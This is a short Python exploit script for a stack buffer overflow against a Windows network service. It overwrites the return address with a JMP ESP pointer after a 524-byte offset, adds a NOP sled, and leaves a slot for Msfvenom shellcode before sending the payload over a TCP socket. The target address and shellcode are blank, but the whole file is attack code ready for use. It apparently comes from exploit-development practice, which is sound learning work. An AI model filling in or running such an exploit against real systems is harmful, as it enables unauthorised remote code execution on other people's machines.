import socket
import struct

# Target configuration
target_ip = ""  # Target IP address
target_port = 0 # Target port number

# Exploit parameters
offset = 524            # Offset Value
JMP_ADDRESS= 0x311712F3 # Address of JMP ESP in little-endian format

prefix=b""
overflow = b"A" * offset
retn = struct.pack("<I",JMP_ADDRESS)  # Replace with your actual address
padding=b"\x90"*16                    # NOP sled


#  Generate Msfvenom shellcode for (Windows ) in python and place it here in 'buf'

buf =  b""

payload = overflow + retn + padding + buf + b"\r\n"



# Send payload
with socket.create_connection((target_ip, target_port)) as conn:
    print(f"[+] Sending {len(payload)} bytes to {target_ip}:{target_port}")
    conn.sendall(payload)
    print("[+] Payload sent successfully.")
